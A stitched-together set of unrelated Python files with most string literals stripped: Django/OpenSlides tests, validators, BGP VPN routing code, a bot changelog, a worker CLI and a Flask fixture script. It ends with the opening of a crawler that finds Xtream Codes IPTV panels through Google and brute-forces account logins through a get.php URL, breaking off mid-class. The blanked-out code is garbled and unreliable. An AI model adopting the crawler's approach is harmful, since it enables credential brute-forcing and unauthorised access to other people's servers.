bases = ( openslides . utils . models . RESTModelMixin , models . Model ) , \n 
) , \n 
] \n 
~~ import json \n 
\n 
from django . core . urlresolvers import reverse \n 
from django . dispatch import receiver \n 
from rest_framework import status \n 
from rest_framework . test import APIClient \n 
\n 
from openslides import __version__ as version \n 
from openslides . core . config import ConfigVariable , config \n 
from openslides . core . models import CustomSlide , Projector \n 
from openslides . core . signals import config_signal \n 
from openslides . utils . rest_api import ValidationError \n 
from openslides . utils . test import TestCase \n 
\n 
\n 
class ProjectorAPI ( TestCase ) : \n 
~~~ """\n    Tests requests from the anonymous user.\n    """ \n 
def test_slide_on_default_projector ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
customslide = CustomSlide . objects . create ( title = , text = default_projector = Projector . objects . get ( pk = 1 ) \n 
default_projector . config = { \n 
: { : , : customslide . id } } \n 
default_projector . save ( ) \n 
\n 
response = self . client . get ( reverse ( , args = [ ] ) ) \n 
\n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: 1 , \n 
: { \n 
: \n 
{ : customslide . id , \n 
: , \n 
: } } , \n 
: 0 , \n 
: 0 } ) \n 
\n 
~~ def test_invalid_slide_on_default_projector ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
default_projector = Projector . objects . get ( pk = 1 ) \n 
default_projector . config = { \n 
: { : } } \n 
default_projector . save ( ) \n 
\n 
response = self . client . get ( reverse ( , args = [ ] ) ) \n 
\n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: 1 , \n 
: { \n 
: \n 
{ : , \n 
: , \n 
: } } , \n 
: 0 , \n 
: 0 } ) \n 
\n 
\n 
~~ ~~ class VersionView ( TestCase ) : \n 
~~~ """\n    Tests the version info view.\n    """ \n 
def test_get ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
response = self . client . get ( reverse ( ) ) \n 
self . assertEqual ( json . loads ( response . content . decode ( ) ) , { \n 
: version , \n 
: [ \n 
{ : , \n 
: , \n 
: } ] } ) \n 
\n 
\n 
~~ ~~ class ConfigViewSet ( TestCase ) : \n 
~~~ """\n    Tests requests to deal with config variables.\n    """ \n 
def test_retrieve ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
config [ ] = \n 
response = self . client . get ( reverse ( , args = [ ] ) ) self . assertEqual ( \n 
response . data , \n 
{ : , \n 
: } ) \n 
\n 
~~ def test_update ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
~~ def test_update_wrong_datatype ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : "Wrong datatype. Expected <class \'int\'>, got <class \'str\'>." \n 
~~ def test_update_wrong_datatype_that_can_be_converted ( self ) : \n 
~~~ """\n        Try to send a string that can be converted to an integer to an integer\n        field.\n        """ \n 
self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , 200 ) \n 
\n 
~~ def test_update_good_choice ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
\n 
~~ def test_update_bad_choice ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_update_validator_ok ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_200_OK ) \n 
self . assertEqual ( config [ ] , ) \n 
\n 
~~ def test_update_validator_invalid ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) , \n 
{ : } ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_update_only_with_key ( self ) : \n 
~~~ self . client = APIClient ( ) \n 
self . client . login ( username = , password = ) \n 
response = self . client . put ( \n 
reverse ( , args = [ ] ) ) \n 
self . assertEqual ( response . status_code , status . HTTP_400_BAD_REQUEST ) \n 
self . assertEqual ( response . data , { : } ) \n 
\n 
~~ def test_metadata_with_hidden ( self ) : \n 
~~~ self . client . login ( username = , password = ) \n 
response = self . client . options ( reverse ( ) ) \n 
filter_obj = filter ( \n 
lambda item : item [ ] == , \n 
response . data [ ] [ 0 ] [ ] [ 0 ] [ ] ) \n 
self . assertEqual ( len ( list ( filter_obj ) ) , 0 ) \n 
\n 
\n 
~~ ~~ def validator_for_testing ( value ) : \n 
~~~ """\n    Validator for testing.\n    """ \n 
if value == : \n 
~~~ raise ValidationError ( { : } ) \n 
\n 
\n 
~~ ~~ @ receiver ( config_signal , dispatch_uid = ) \n 
def set_simple_config_view_integration_config_test ( sender , ** kwargs ) : \n 
~~~ """\n    Sets a simple config view with some config variables but without\n    grouping.\n    """ \n 
yield ConfigVariable ( \n 
name = , \n 
default_value = None , \n 
label = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = 0 , \n 
input_type = ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = , \n 
input_type = , \n 
choices = ( \n 
{ : , : } , { : , : } ) \n 
yield ConfigVariable ( \n 
name = , \n 
default_value = , \n 
validators = ( validator_for_testing , ) ) \n 
\n 
yield ConfigVariable ( \n 
name = , \n 
default_value = None , \n 
label = , \n 
hidden = True ) \n 
~~ from unittest import TestCase \n 
from unittest . mock import MagicMock , patch \n 
\n 
from openslides . users . serializers import UserFullSerializer \n 
from openslides . utils . rest_api import ValidationError \n 
\n 
\n 
class UserCreateUpdateSerializerTest ( TestCase ) : \n 
~~~ def test_validate_no_data ( self ) : \n 
~~~ """\n        Tests, that the validator raises a ValidationError, if not data is given.\n        """ \n 
serializer = UserFullSerializer ( ) \n 
data = { } \n 
\n 
with self . assertRaises ( ValidationError ) : \n 
~~~ serializer . validate ( data ) \n 
\n 
~~ ~~ @ patch ( ) \n 
def test_validate_no_username ( self , generate_username ) : \n 
~~~ """\n        Tests, that an empty username is generated.\n        """ \n 
generate_username . return_value = \n 
serializer = UserFullSerializer ( ) \n 
data = { : } \n 
\n 
new_data = serializer . validate ( data ) \n 
\n 
self . assertEqual ( new_data [ ] , ) \n 
\n 
~~ def test_validate_no_username_in_patch_request ( self ) : \n 
~~~ """\n        Tests, that an empty username is not set in a patch request context.\n        """ \n 
view = MagicMock ( action = ) \n 
serializer = UserFullSerializer ( context = { : view } ) \n 
data = { : } \n 
\n 
new_data = serializer . validate ( data ) \n 
\n 
self . assertIsNone ( new_data . get ( ) ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """\ncore.validators.py\n~~~~~~\n\n:copyright: (c) 2014 by @zizzamia\n:license: BSD (See LICENSE for details)\n""" \n 
# Imports outside Bombolone \n 
import re \n 
\n 
# Thanks http://stackoverflow.com/questions/7160737/python-how-to-validate-a-url-in-python-malformed-or-not URL_REGEX = re . compile ( \n 
# http:// or https:// \n 
#domain... #localhost... \n 
# ...or ip \n 
# optional port \n 
, re . IGNORECASE ) \n 
USERNAME_REGEX = re . compile ( , re . I ) \n 
FULLNAME_REGEX = re . compile ( , re . U ) \n 
EMAIL_REGEX = re . compile ( , re . IGNORECASE ) \n 
\n 
class CheckValue ( object ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ pass \n 
\n 
~~ def length ( self , data , minimum = - 1 , maximum = - 1 ) : \n 
~~~ """ Validates the length of a string\n        :param min: The minimum required length of the string.\n        :param max: The maximum length of the string \n\n        """ \n 
len_input = len ( data ) \n 
\n 
if len_input < minimum or maximum != - 1 and len_input > maximum : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ def regexp ( self , data , regex , flags = 0 ) : \n 
~~~ """ Validates the data with regexp\n        :param regex: The regular expression string to use.\n        :param flags: The regexp flags eg. re.I (case-insensitive) \n\n        """ \n 
regex = re . compile ( regex , flags ) \n 
if regex . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def username ( self , data ) : \n 
~~~ """ Validates the username\n        :param username: The string \n\n        """ \n 
if USERNAME_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def full_name ( self , data ) : \n 
~~~ """ Validates the full name\n        :param full_name: The string \n\n        """ \n 
if FULLNAME_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def email ( self , data ) : \n 
~~~ """ Validates the email\n        :param email: The string \n\n        """ \n 
if EMAIL_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def url ( self , data ) : \n 
~~~ """ Validates the url\n        :param url: The string \n\n        """ \n 
if URL_REGEX . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def url_two ( self , data ) : \n 
~~~ """\n        Validates the url \n        :param url: The string  \n        \n        """ \n 
regex = re . compile ( , re . IGNORECASE ) \n 
if regex . match ( data ) : \n 
~~~ return True \n 
~~ return False \n 
\n 
~~ def is_integer ( self , data ) : \n 
~~~ """ """ \n 
try : \n 
~~~ tmp = int ( data ) \n 
return True \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def float ( self , data ) : \n 
~~~ """ """ \n 
try : \n 
~~~ tmp = float ( data ) \n 
return True \n 
~~ except : \n 
~~~ return False \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
# encoding: utf-8 \n 
\n 
# Copyright 2014 Orange \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ ~~ import logging \n 
import socket \n 
\n 
from bagpipe . bgp . common import utils \n 
from bagpipe . bgp . common import logDecorator \n 
\n 
from bagpipe . bgp . vpn . vpn_instance import VPNInstance \n 
\n 
from bagpipe . bgp . engine import RouteEvent \n 
\n 
from bagpipe . bgp . vpn . dataplane_drivers import DummyDataplaneDriver as _DummyDataplaneDriver \n 
\n 
from bagpipe . bgp . common . looking_glass import LookingGlass , LGMap \n 
\n 
from bagpipe . exabgp . structure . vpn import RouteDistinguisher , VPNLabelledPrefix \n 
from bagpipe . exabgp . structure . mpls import LabelStackEntry \n 
from bagpipe . exabgp . structure . address import AFI , SAFI \n 
from bagpipe . exabgp . structure . ip import Inet , Prefix \n 
from bagpipe . exabgp . message . update . route import Route \n 
from bagpipe . exabgp . message . update . attribute . nexthop import NextHop \n 
from bagpipe . exabgp . message . update . attribute . communities import ECommunities \n 
\n 
\n 
class DummyDataplaneDriver ( _DummyDataplaneDriver ) : \n 
\n 
~~~ pass \n 
\n 
\n 
~~ class VRF ( VPNInstance , LookingGlass ) : \n 
# component managing a VRF: \n 
# - calling a driver to instantiate the dataplane \n 
# - registering to receive routes for the needed route targets \n 
# - calling the driver to setup/update/remove routes in the dataplane \n 
# - cleanup: calling the driver, unregistering for BGP routes \n 
\n 
~~~ type = "ipvpn" \n 
afi = AFI ( AFI . ipv4 ) \n 
safi = SAFI ( SAFI . mpls_vpn ) \n 
\n 
@ logDecorator . log \n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ VPNInstance . __init__ ( self , * args , ** kwargs ) \n 
self . readvertised = set ( ) \n 
\n 
~~ def _routeFrom ( self , prefix , label , rd ) : \n 
~~~ return Route ( VPNLabelledPrefix ( self . afi , self . safi , prefix , rd , \n 
[ LabelStackEntry ( label , True ) ] \n 
) ) \n 
\n 
~~ def generateVifBGPRoute ( self , macAdress , ipPrefix , prefixLen , label ) : \n 
# Generate BGP route and advertise it... \n 
~~~ route = self . _routeFrom ( Prefix ( self . afi , ipPrefix , prefixLen ) , label , \n 
RouteDistinguisher ( \n 
RouteDistinguisher . TYPE_IP_LOC , None , \n 
self . bgpManager . getLocalAddress ( ) , \n 
self . instanceId ) \n 
) \n 
self . log . debug ( "route attributes: %s" , route . attributes ) \n 
\n 
return self . _newRouteEntry ( self . afi , self . safi , self . exportRTs , \n 
route . nlri , route . attributes ) \n 
\n 
~~ def _getLocalLabels ( self ) : \n 
~~~ for portData in self . macAddress2LocalPortData . itervalues ( ) : \n 
~~~ yield portData [ ] \n 
\n 
~~ ~~ def _getRDFromLabel ( self , label ) : \n 
# FIXME: this is a crude hack that will break beyond 10000 VRFs \n 
~~~ return RouteDistinguisher ( RouteDistinguisher . TYPE_IP_LOC , None , \n 
self . bgpManager . getLocalAddress ( ) , \n 
10000 + label ) \n 
\n 
~~ def _routeForReAdvertisement ( self , prefix , label ) : \n 
~~~ route = self . _routeFrom ( prefix , label , \n 
self . _getRDFromLabel ( label ) ) \n 
\n 
nh = Inet ( 1 , socket . inet_pton ( socket . AF_INET , \n 
self . dataplane . driver . getLocalAddress ( ) ) ) \n 
\n 
route . attributes . add ( NextHop ( nh ) ) \n 
\n 
route . attributes . add ( ECommunities ( self . readvertiseToRTs ) ) \n 
\n 
routeEntry = self . _newRouteEntry ( self . afi , self . safi , \n 
self . readvertiseToRTs , \n 
route . nlri , route . attributes ) \n 
return routeEntry \n 
\n 
~~ @ logDecorator . log \n 
def _readvertise ( self , nlri ) : \n 
~~~ self . log . debug ( "Start re-advertising %s from VRF" , nlri . prefix ) \n 
for label in self . _getLocalLabels ( ) : \n 
~~~ self . log . debug ( "Start re-advertising %s from VRF, with label %s" , \n 
nlri . prefix , label ) \n 
# need a distinct RD for each route... \n 
routeEntry = self . _routeForReAdvertisement ( nlri . prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . ADVERTISE , routeEntry ) ) \n 
\n 
~~ self . readvertised . add ( nlri . prefix ) \n 
\n 
~~ @ logDecorator . log \n 
def _readvertiseStop ( self , nlri ) : \n 
~~~ self . log . debug ( "Stop re-advertising %s from VRF" , nlri . prefix ) \n 
for label in self . _getLocalLabels ( ) : \n 
~~~ self . log . debug ( "Stop re-advertising %s from VRF, with label %s" , \n 
nlri . prefix , label ) \n 
routeEntry = self . _routeForReAdvertisement ( nlri . prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . WITHDRAW , routeEntry ) ) \n 
\n 
~~ self . readvertised . remove ( nlri . prefix ) \n 
\n 
~~ def vifPlugged ( self , macAddress , ipAddressPrefix , localPort , \n 
advertiseSubnet ) : \n 
~~~ VPNInstance . vifPlugged ( self , macAddress , ipAddressPrefix , localPort , \n 
advertiseSubnet ) \n 
\n 
label = self . macAddress2LocalPortData [ macAddress ] [ ] \n 
for prefix in self . readvertised : \n 
~~~ self . log . debug ( "Re-advertising %s with this port as next hop" , \n 
prefix ) \n 
routeEntry = self . _routeForReAdvertisement ( prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . ADVERTISE , routeEntry ) ) \n 
\n 
~~ ~~ def vifUnplugged ( self , macAddress , ipAddressPrefix , advertiseSubnet ) : \n 
~~~ label = self . macAddress2LocalPortData [ macAddress ] [ ] \n 
for prefix in self . readvertised : \n 
~~~ self . log . debug ( "Stop re-advertising %s with this port as next hop" , \n 
prefix ) \n 
routeEntry = self . _routeForReAdvertisement ( prefix , label ) \n 
self . _pushEvent ( RouteEvent ( RouteEvent . WITHDRAW , routeEntry ) ) \n 
\n 
~~ VPNInstance . vifUnplugged ( self , macAddress , ipAddressPrefix , \n 
advertiseSubnet ) \n 
\n 
# Callbacks for BGP route updates (TrackerWorker) ######################## \n 
\n 
~~ def _route2trackedEntry ( self , route ) : \n 
~~~ if isinstance ( route . nlri , VPNLabelledPrefix ) : \n 
~~~ return route . nlri . prefix \n 
~~ else : \n 
~~~ self . log . error ( "We should not receive routes of type %s" , \n 
type ( route . nlri ) ) \n 
return None \n 
\n 
~~ ~~ def _toReadvertise ( self , route ) : \n 
~~~ return ( len ( set ( route . routeTargets ) . intersection ( \n 
set ( self . readvertiseFromRTs ) ) ) > 0 ) \n 
\n 
~~ def _imported ( self , route ) : \n 
~~~ return ( len ( set ( route . routeTargets ) . intersection ( \n 
set ( self . importRTs ) ) ) > 0 ) \n 
\n 
~~ @ utils . synchronized \n 
@ logDecorator . log \n 
def _newBestRoute ( self , entry , newRoute ) : \n 
\n 
~~~ prefix = entry \n 
\n 
if self . readvertise : \n 
# check if this is a route we need to re-advertise \n 
~~~ self . log . debug ( "route RTs: %s" , newRoute . routeTargets ) \n 
self . log . debug ( "readv from RTs: %s" , self . readvertiseFromRTs ) \n 
if self . _toReadvertise ( newRoute ) : \n 
~~~ self . log . debug ( "Need to re-advertise %s" , prefix ) \n 
self . _readvertise ( newRoute . nlri ) \n 
if not self . _imported ( newRoute ) : \n 
~~~ self . log . debug ( "No need to setup dataplane for:%s" , prefix ) \n 
return \n 
\n 
~~ ~~ ~~ encaps = self . _checkEncaps ( newRoute ) \n 
if not encaps : \n 
~~~ return \n 
\n 
~~ self . dataplane . setupDataplaneForRemoteEndpoint ( \n 
prefix , newRoute . attributes . get ( NextHop . ID ) . next_hop , \n 
newRoute . nlri . labelStack [ 0 ] . labelValue , newRoute . nlri , encaps ) \n 
\n 
~~ @ utils . synchronized \n 
@ logDecorator . log \n 
def _bestRouteRemoved ( self , entry , oldRoute , last ) : \n 
\n 
~~~ prefix = entry \n 
\n 
if self . readvertise and last : \n 
# check if this is a route we were re-advertising \n 
~~~ if self . _toReadvertise ( oldRoute ) : \n 
~~~ self . log . debug ( "Need to stop re-advertising %s" , prefix ) \n 
self . _readvertiseStop ( oldRoute . nlri ) \n 
if not self . _imported ( oldRoute ) : \n 
~~~ self . log . debug ( "No need to setup dataplane for:%s" , prefix ) \n 
return \n 
\n 
~~ ~~ ~~ if self . _skipRouteRemoval ( last ) : \n 
~~~ self . log . debug ( "Skipping removal of non-last route because " \n 
"dataplane does not want it" ) \n 
return \n 
\n 
~~ self . dataplane . removeDataplaneForRemoteEndpoint ( \n 
prefix , oldRoute . attributes . get ( NextHop . ID ) . next_hop , \n 
oldRoute . nlri . labelStack [ 0 ] . labelValue , oldRoute . nlri ) \n 
\n 
~~ def getLGMap ( self ) : \n 
~~~ return { \n 
"readvertised" : ( LGMap . VALUE , [ repr ( prefix ) for prefix in \n 
self . readvertised ] ) \n 
} \n 
# encoding: utf-8 \n 
~~ ~~ """\nattributes.py\n\nCreated by Thomas Mangin on 2009-11-05.\nCopyright (c) 2009-2012 Exa Networks. All rights reserved.\nModified by Orange - 2014\n""" \n 
\n 
from bagpipe . exabgp . message . update . attribute import AttributeID , Flag , Attribute \n 
\n 
# =================================================================== Origin (1) \n 
\n 
class Origin ( Attribute ) : \n 
~~~ ID = AttributeID . ORIGIN \n 
FLAG = Flag . TRANSITIVE \n 
MULTIPLE = False \n 
\n 
IGP = 0x00 \n 
EGP = 0x01 \n 
INCOMPLETE = 0x02 \n 
\n 
def __init__ ( self , origin ) : \n 
~~~ self . origin = origin \n 
\n 
~~ def pack ( self ) : \n 
~~~ return self . _attribute ( chr ( self . origin ) ) \n 
\n 
~~ def __len__ ( self ) : \n 
~~~ return len ( self . pack ( ) ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if self . origin == 0x00 : return \n 
if self . origin == 0x01 : return \n 
if self . origin == 0x02 : return \n 
return \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return str ( self ) \n 
\n 
~~ def __cmp__ ( self , other ) : \n 
~~~ if ( not isinstance ( other , Origin ) \n 
or ( self . origin != other . origin ) \n 
) : \n 
~~~ return - 1 \n 
~~ else : \n 
~~~ return 0 \n 
~~ ~~ ~~ """\n2012-12-03 r23\n\t- added support for IPv6 addresses in commands (Issue #18)\n\n2011-04-01 r22\n\t- new configuration: toggle handling of !commit command;\n\t- use new API modules for getGlobalRights;\n\t- use new API modules for getGlobalDetails (merged from getGlobalAccounts and getGlobalEdits);\n\t- simplified package design.\n\n2011-03-29 r21\n\t- bugfix: Wikimedia handler assigned incorrect family for betwikiversity.\n\n2011-03-01 r20\n\t- bugfix: global edit count parsing broken in MW1.17wmf;\n\t- added command parameter trimming.\n\n2010-11-20 r19\n\t- !stabhide conflict detection algorithm revamped;\n\t- !stabhide now has \'hard\' option to hide accounts even if they have edits.\n\n2010-10-17 r18\n\t- Wikimedia.py: fixed handling of special *wikimedia wikis.\n\n2010-08-09 r17\n\t- !stabhide overrides no-local-block list.\n\n2010-08-08 r16\n\t- !stab no longer blocks on enwikibooks, per\n\t  http://lists.wikimedia.org/pipermail/foundation-l/2010-August/060447.html\n\n2010-07-13 r15\n\t- now raises ValueError when user is assigned multiple access levels in config;\n\t- overrode StrictDict iterators to never iterate over internal __name__ item.\n\n2010-06-29 r14\n\t- BREAKING CHANGE: replaced config.debug* options for straight-to-file state\n\t  dumping with new config.components.exceptionLogger. The config.debug*\n\t  lines can be safely removed from configuration files without replacement\n\t  to send exceptions to ERROR_LOG.txt in the bot directory.\n\t- abstracted string encoding, fixed encoding crash when logging non-latin\n\t  characters.\n\n2010-06-28 r13\n\t- added configurable logging/output (messages can now be sent to console, file, or nowhere);\n\t- prefer packaged modules over system modules (resolves version conflicts);\n\t- added stewbot version number.\n\n2010-05-15 r12\n\t- updated CentralAuth scraping for interface changes.\n\n2010-05-13 r11\n\t- disabled !activity for en.wikipedia.\n\n2010-04-30 r10\n\t- added randomized exit messages.\n\n2010-04-27 r9\n\t- bugfix: reblockIfChanged did nothing if reblock=false.\n\n2010-04-18 r8\n\t- bugfix: when hiding an account that is already suppressed, treat \'suppressed\' as \'hidden\'\n\t  to avoid implicitly reducing hide level.\n\n2010-04-17 r7\n\t- added !getblocks command;\n\t- show edit count in !stab* output;\n\t- added IP support in Browser::getBlockStatus(), which now returns array;\n\t- added Browser::getGlobalBlocks() & Browser::getCentralAuthStatus();\n\t- bugfix: page creations counted twice in !stab output if they\'re also top edits.\n\n2010-04-15 r6\n\t- bugfix: exception when processing queue range with multiple gaps.\n\n2010-04-11 r5\n\t- updated CentralAuth scraping for new interface;\n\t- added !globalOversight command (requires new CentralAuth interface);\n\t- removed disabled global account deletion;\n\t- moved to DefaultSettings & validated __config__ scheme;\n\t- fixed HTTP parser bug when \'<br/>\' has no space before the slash;\n\t- updated /modules/mechanize.\n\n2010-04-06 r4\n\t- updated for MediaWiki API change: https://bugzilla.wikimedia.org/show_bug.cgi?id=23076 .\n\n2010-03-29 r3\n\t- packaged irclib and simplejson into /modules/.\n\t- added SSL for IRC.\n\n2010-03-27 r2\n\t- bugfix: commands can be queued for !commit even if they\'re configured as uncommittable (issue #5).\n\n2010-03-26 r1\n\t- now open-source; initial commit.\n""" \n 
"""\nThis should probably be rewritten at some point. It\'s not taking good\nadvantage of argparse.\n""" \n 
\n 
import argparse \n 
import sys \n 
import time \n 
import inspect \n 
import logging \n 
import signal \n 
import sys \n 
from multiprocessing import Process \n 
\n 
import tasa \n 
from tasa . worker import BaseWorker \n 
\n 
\n 
logger = logging . getLogger ( __name__ ) \n 
logging . basicConfig ( level = logging . INFO ) \n 
\n 
\n 
def signal_handler ( signal , frame ) : \n 
~~~ sys . exit ( 0 ) \n 
\n 
\n 
~~ def _get_argparser ( ) : \n 
~~~ parser = argparse . ArgumentParser ( ) \n 
parser . add_argument ( \n 
, , action = , \n 
version = % ( \n 
tasa . __version__ , sys . version ) ) \n 
# add common argparser arguments here \n 
return parser \n 
\n 
\n 
~~ def run ( ) : \n 
~~~ sys . path . insert ( 0 , ) \n 
parser = _get_argparser ( ) \n 
parser . description = \n 
parser . add_argument ( , \n 
type = lambda w : w . partition ( ) [ : : 2 ] , \n 
help = \n 
\'"path.to.my.module:MyWorkerClass". Relative to \' \n 
) \n 
args = parser . parse_args ( ) \n 
\n 
worker_class_name = args . worker [ 1 ] or \n 
worker_module = __import__ ( args . worker [ 0 ] , globals ( ) , locals ( ) , \n 
[ worker_class_name ] ) \n 
try : \n 
~~~ WorkerClass = getattr ( worker_module , worker_class_name ) \n 
~~ except AttributeError : \n 
~~~ print "No matching workers found.\\n" \n 
potential_workers = inspect . getmembers ( \n 
worker_module , \n 
lambda x : type ( x ) == type and issubclass ( x , BaseWorker ) ) \n 
if potential_workers : \n 
~~~ print "Found potential workers:" \n 
for name , value in potential_workers : \n 
~~~ print . join ( [ args . worker [ 0 ] , name ] ) \n 
~~ ~~ exit ( 1 ) \n 
~~ worker = WorkerClass ( ) \n 
print % ( args . worker [ 0 ] , \n 
worker . __class__ . __name__ ) \n 
try : \n 
~~~ for job in worker : \n 
~~~ if job : \n 
~~~ logger . info ( "Doing job: %s:%s" , \n 
worker . __class__ . __name__ , \n 
str ( job ) [ : 50 ] ) \n 
~~ else : \n 
# FIXME: do something better here \n 
~~~ time . sleep ( .3 ) \n 
~~ ~~ ~~ except KeyboardInterrupt : \n 
~~~ print \n 
\n 
\n 
~~ ~~ def runm ( ) : \n 
~~~ """ This is super minimal and pretty hacky, but it counts as a first pass.\n    """ \n 
signal . signal ( signal . SIGINT , signal_handler ) \n 
count = int ( sys . argv . pop ( 1 ) ) \n 
processes = [ Process ( target = run , args = ( ) ) for x in range ( count ) ] \n 
try : \n 
~~~ for p in processes : \n 
~~~ p . start ( ) \n 
~~ ~~ except KeyError : \n 
# Not sure why we see a keyerror here. Weird. \n 
~~~ pass \n 
~~ finally : \n 
~~~ for p in processes : \n 
~~~ p . join ( ) \n 
\n 
\n 
~~ ~~ ~~ def log ( ) : \n 
~~~ parser = _get_argparser ( ) \n 
parser . description = \n 
args = parser . parse_args ( ) \n 
raise NotImplemented ( ) \n 
\n 
\n 
~~ if __name__ == : \n 
# deal with being run directly rather than as an installed script \n 
~~~ cmd = if len ( sys . argv ) < 2 else sys . argv . pop ( 1 ) \n 
if cmd == : \n 
~~~ run ( ) \n 
~~ elif cmd == : \n 
~~~ log ( ) \n 
~~ else : \n 
~~~ print "First argument must be \'run\' or \'log\'" \n 
~~ ~~ """Initialize DB with fixtures.""" \n 
from time import sleep \n 
from flask import Flask \n 
from flask_tut . models import ( \n 
db , \n 
User , \n 
Address , \n 
) \n 
\n 
app = Flask ( __name__ ) \n 
\n 
with app . app_context ( ) : \n 
~~~ db . create_all ( ) \n 
\n 
~~ i = 0 \n 
while i < 30 : \n 
~~~ address = Address ( description = + str ( i ) . rjust ( 2 , "0" ) ) \n 
db . session . add ( address ) \n 
user = User ( name = + str ( i ) . rjust ( 2 , "0" ) ) \n 
user . address = address \n 
db . session . add ( user ) \n 
sleep ( 1 ) \n 
i += 1 \n 
~~ db . session . commit ( ) \n 
import urllib2 \n 
import google \n 
import time \n 
import pyprind \n 
import os \n 
import random \n 
from urlparse import urlparse \n 
\n 
"""Crawler\nClass that handles the crawling process that fetch accounts on illegal IPTVs\n\nAuthors:\nClaudio Ludovico (@Ludo237)\nPinperepette (@Pinperepette)\nArm4x (@Arm4x)\n""" \n 
class Crawler ( object ) : \n 
# version \n 
~~~ version = "1.2.3" \n 
# output default directory \n 
outputDir = "output" \n 
# language default directory \n 
languageDir = "languages" \n 
# string used to exploit the CMS \n 
basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts" \n 
# string used to search the CMS \n 
searchString = "Xtream Codes v1.0.59.5" \n 
\n 
def __init__ ( self , language = "it" ) : \n 
~~~ """Default constructor\n\n        Keyword arguments:\n        language -- Language parameter allows us to understand what kind of\n                    names file we need to use. (default it)\n        """ \n 
self . language = language . lower ( ) \n 
self . parsedUrls = [ ] \n 
self . foundedAccounts = 0 \n 
\n 
~~ def change_language ( self , language = "it" ) : \n 
~~~ """Set the language you want to use to brute force names\n\n        Keyword arguments:\n        language -- Language parameter allows us to understand what kind of\n                    names file we need to use. (default it)\n\n        Return:\n        boolean -- true if the language file exists, otherwise false\n        """ \n 
if os . path . isfile ( self . languageDir + "/" + language + ".txt" ) : \n 
~~~ self . language = language \n 
return True \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ def search_links ( self ) : \n 
~~~ """Print the first 30 links from a Web search\n\n        We set the limit of 30 links because this script serve as demonstration and it\'s\n        not intended to be use for personal purpose.\n        """ \n 
for url in google . search ( self . searchString , num = 30 , stop = 1 ) : \n 
~~~ parsed = urlparse ( url ) \n 
self . parsedUrls . append ( parsed . scheme + "://" + parsed . netloc ) \n 
\n 
~~ ~~ def search_accounts ( self , url = None ) : \n 
